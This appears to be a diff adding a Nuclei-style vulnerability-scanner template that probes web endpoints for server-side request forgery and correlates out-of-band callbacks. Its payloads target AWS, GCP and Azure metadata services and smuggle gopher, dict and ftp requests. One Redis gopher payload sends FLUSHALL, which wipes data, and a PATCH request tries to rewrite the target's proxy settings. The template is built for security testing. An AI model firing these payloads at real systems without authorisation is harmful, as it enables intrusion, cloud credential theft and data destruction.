@@ -1,0 +1,231 @@
+id: ssrf-advanced-chain-correlation-oob
+
+info:
+  name: Advanced SSRF Chain with Callback Correlation
+  author: geeknik
+  severity: critical
+  description: |
+    Detects Server-Side Request Forgery vulnerabilities through multi-hop attack chains
+    targeting cloud metadata services, internal services, and protocol smuggling with
+    hierarchical callback correlation for attack path reconstruction.
+  reference:
+    - https://portswigger.net/web-security/ssrf
+    - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
+    - https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-ecs-efs#metadata-service
+    - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-918
+  tags: ssrf,metadata,cloud,internal,protocol-smuggling,oob,chain,correlation
+
+variables:
+  callback_url: "{{interactsh-url}}"
+  chain_id: "{{randstr}}"
+  ssrf_payload: |
+    # Stage 1: Direct callback
+    http://{{callback_url}}/stage1-direct-{{chain_id}}
+
+    # Stage 2: AWS Metadata with callback chain
+    http://169.254.169.254/latest/meta-data/local-ipv4?callback=http://{{callback_url}}/stage2-aws-{{chain_id}}
+
+    # Stage 3: GCP Metadata with callback
+    http://metadata.google.internal/computeMetadata/v1/instance/name?callback=http://{{callback_url}}/stage3-gcp-{{chain_id}}
+
+    # Stage 4: Azure Metadata with callback
+    http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01&callback=http://{{callback_url}}/stage4-azure-{{chain_id}}
+
+    # Stage 5: Protocol smuggling - Gopher
+    gopher://{{callback_url}}:80/_GET%20/stage5-gopher-{{chain_id}}%20HTTP/1.1%0d%0aHost:%20{{callback_url}}%0d%0a%0d%0a
+
+    # Stage 6: Protocol smuggling - Dict
+    dict://{{callback_url}}:80/stage6-dict-{{chain_id}}:info
+
+    # Stage 7: Protocol smuggling - FTP
+    ftp://{{callback_url}}:21/stage7-ftp-{{chain_id}}
+
+    # Stage 8: Internal service discovery
+    http://localhost:8080/health?callback=http://{{callback_url}}/stage8-internal-{{chain_id}}
+
+    # Stage 9: Redis exploitation
+    gopher://localhost:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$9%0d%0acallback1%0d%0a${{len("http://{{callback_url}}/stage9-redis-{{chain_id}}")}}%0d%0ahttp://{{callback_url}}/stage9-redis-{{chain_id}}%0d%0a
+
+    # Stage 10: Cloud function trigger
+    http://localhost:8080/v1/{{callback_url}}/stage10-function-{{chain_id}}
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/"
+      - "{{BaseURL}}/proxy"
+      - "{{BaseURL}}/fetch"
+      - "{{BaseURL}}/curl"
+      - "{{BaseURL}}/wget"
+      - "{{BaseURL}}/image"
+      - "{{BaseURL}}/thumbnail"
+      - "{{BaseURL}}/preview"
+
+    payloads:
+      param:
+        - "url"
+        - "link"
+        - "target"
+        - "proxy"
+        - "fetch"
+        - "image"
+        - "src"
+        - "destination"
+        - "endpoint"
+        - "callback"
+
+    raw:
+      - |
+        GET {{path}}?{{param}}={{ssrf_payload}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; SSRF-Scanner/1.0)
+        Accept: */*
+        Connection: close
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/proxy"
+      - "{{BaseURL}}/fetch"
+      - "{{BaseURL}}/webhook"
+      - "{{BaseURL}}/api/proxy"
+      - "{{BaseURL}}/api/fetch"
+
+    headers:
+      Content-Type: application/json
+      Accept: application/json
+
+    payloads:
+      field:
+        - "url"
+        - "target"
+        - "endpoint"
+        - "proxy_url"
+        - "fetch_url"
+        - "webhook_url"
+
+    body: |
+      {
+        "{{field}}": "{{ssrf_payload}}"
+      }
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/proxy"
+      - "{{BaseURL}}/fetch"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    payloads:
+      param:
+        - "url"
+        - "target"
+        - "proxy"
+        - "fetch"
+
+    body: "{{param}}={{ssrf_payload}}"
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/webhook"
+      - "{{BaseURL}}/api/webhook"
+      - "{{BaseURL}}/callback"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "webhook_url": "http://{{callback_url}}/stage11-webhook-{{chain_id}}",
+        "callback_url": "http://{{callback_url}}/stage12-callback-{{chain_id}}",
+        "notification_url": "http://{{callback_url}}/stage13-notification-{{chain_id}}"
+      }
+
+  - method: PATCH
+    path:
+      - "{{BaseURL}}/config"
+      - "{{BaseURL}}/settings"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "proxy_server": "http://{{callback_url}}:8080",
+        "upstream_server": "http://{{callback_url}}/stage14-upstream-{{chain_id}}",
+        "health_check_url": "http://{{callback_url}}/stage15-health-{{chain_id}}"
+      }
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/admin/test"
+      - "{{BaseURL}}/test/connection"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "test_url": "http://{{callback_url}}/stage16-test-{{chain_id}}",
+        "endpoints": [
+          "http://{{callback_url}}/stage17-endpoint1-{{chain_id}}",
+          "http://{{callback_url}}/stage18-endpoint2-{{chain_id}}"
+        ]
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+      - type: word
+        part: interactsh_request
+        words:
+          - "stage1-direct-"
+          - "stage2-aws-"
+          - "stage3-gcp-"
+          - "stage4-azure-"
+          - "stage5-gopher-"
+          - "stage6-dict-"
+          - "stage7-ftp-"
+          - "stage8-internal-"
+          - "stage9-redis-"
+          - "stage10-function-"
+          - "stage11-webhook-"
+          - "stage12-callback-"
+          - "stage13-notification-"
+          - "stage14-upstream-"
+          - "stage15-health-"
+          - "stage16-test-"
+          - "stage17-endpoint1-"
+          - "stage18-endpoint2-"
+        condition: or
+
+    extractors:
+      - type: kval
+        part: interactsh_request
+        kval:
+          - interactsh_request
+        internal: true
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "/stage([0-9]+)-([a-z]+)-([a-z0-9]+)"
+        group: 1,2,3
+        internal: true
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "Host: ([^\\r\\n]+)"
+        group: 1
